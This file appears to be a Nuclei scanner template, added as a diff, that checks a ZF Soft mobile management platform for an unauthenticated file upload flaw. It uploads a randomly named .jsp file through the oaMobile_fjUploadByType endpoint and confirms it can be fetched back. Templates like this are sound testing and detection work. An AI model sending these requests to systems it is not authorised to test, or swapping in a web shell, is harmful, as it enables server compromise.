@@ -1,0 +1,50 @@
+id: zfsoft-mobile-file-upload
+
+info:
+  name: ZF Soft - Mobile File Upload
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    正方移动信息服务管理系统oaMobile_fjUploadByType存在文件上传漏洞.
+  tags: 正方软件-移动信息服务管理平台
+
+http:
+  - raw:
+      - |
+        POST /zftal-mobile/oaMobile/oaMobile_fjUploadByType.html HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.1707.77 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+        Accept: */*
+        Content-Length: 457
+
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Disposition: form-data; name="yhm"
+
+        123
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Disposition: form-data; name="zid"
+
+        456
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Disposition: form-data; name="sign"
+
+        789
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Disposition: form-data; name="file"; filename="{{randstr_1}}.jsp"
+        Content-Type: text/plain
+
+        {{randstr_2}}
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+      - |
+        GET  /zftal-mobile/oaFjUploadByType/{{randstr_1}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200"
+          - "status_code_2 == 200"
+          - "contains(body_2,'{{randstr_2}}')"
+        condition: and
